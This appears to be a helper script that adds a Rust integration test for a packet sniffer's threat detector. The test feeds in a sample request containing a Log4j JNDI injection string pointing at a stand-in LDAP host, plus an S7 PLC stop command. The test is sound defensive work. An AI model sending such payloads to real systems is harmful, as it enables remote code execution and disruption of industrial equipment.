with open('src-tauri/src/sniffer.rs', 'r', encoding='utf-8') as f:
    text = f.read()

test_code = r'''
    #[test]
    fn test_sniffer_payload_threat_detection_integration() {
        // 构造带有工控 S7 停机和 Log4j 注入的真实 Payload 报文
        let malicious_payload = b"POST /api?param=${jndi:ldap://10.0.0.1/evil} HTTP/1.1\r\nP_STOP";
        let hits = crate::threat_detector::detect_threats_in_payload(malicious_payload);
        
        assert_eq!(hits.len(), 2, "流水线必须在单遍扫描中同时捕获 Log4j 与 S7 停机指令");
        let sig_ids: Vec<u32> = hits.iter().map(|h| h.signature_id).collect();
        assert!(sig_ids.contains(&1001)); // S7 P_STOP
        assert!(sig_ids.contains(&2001)); // Log4j
    }
'''

if 'test_sniffer_payload_threat_detection_integration' not in text:
    last_brace = text.rfind('}')
    text = text[:last_brace] + test_code + "\n}\n"
    with open('src-tauri/src/sniffer.rs', 'w', encoding='utf-8') as f:
        f.write(text)
    print("TEST_SNIFFER_THREAT_ADDED")
else:
    print("ALREADY_ADDED")
